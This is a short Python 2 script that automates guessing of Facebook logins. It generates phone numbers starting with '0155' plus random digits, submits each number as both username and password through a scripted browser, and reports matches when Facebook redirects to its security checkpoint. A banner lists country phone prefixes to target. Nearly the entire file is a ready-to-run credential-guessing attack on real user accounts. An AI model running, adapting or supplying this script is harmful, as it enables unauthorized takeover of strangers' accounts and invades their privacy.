#import mechanicalsoup
import sys
import mechanize
import cookielib
import random
import os
r=("\033[1;31m")
g=("\033[1;32m")
y=("\033[1;33m")
b=("\033[1;34m")
c=("\033[1;36m")
def sem():
 print b
 print "      _ __ ___   __ ___  __"

 print y,"  Egypt {010 / 011 / 012}   "
 print y,"  United States {98 / 62 }"
 print y,"  Yemen {7}"
 print y,"  Syria {9}"
 print y,"  Available {}"

 print g
#sem()







kk = str("0155")


def opop():
#email = str(raw_input("email"))
 email = str(random.randint(1111111,9999999))
 go = kk + email
#password = str(raw_input("bass" ))
 password = str(random.randint(1111111,9999999))
 login = 'https://www.facebook.com/login.php?login_attempt=1'

 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 basss = random.randint(1111111,9999999)

 br = mechanize.Browser()
 max = cookielib.LWPCookieJar()
 br.set_handle_robots(False)
#ali max mmpp
 br.set_handle_redirect(True)
 br.set_cookiejar(max)
 br.set_handle_equiv(True)
#python max 
# br.set_handle_referer(True)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
 br.addheaders = [('User-agent', random.choice(useragents))]
 site = br.open(login)
#payload5
 br.select_form(nr = 0)
 br.form['email'] = go
 br.form['pass'] = go
 sub = br.submit()
 log = sub.geturl()
# print (log)
 print b,"[" + r +"*" + b +"] Trying ==>",r,go
 if "https://www.facebook.com/checkpoint/?next" in log :
   print g,"[" + y + "+" + g + "] Found  ===============>",c,go
 elif "https://www.facebook.com/login.php" and "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
   print ""
 elif "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
   print ""

 else :
   print y,"--------------------------------"
   print g,"email ---------> ",g,go
   print g,"pass ---------> ",g,go
   print y,"--------------------------------"
 opop()
opop()
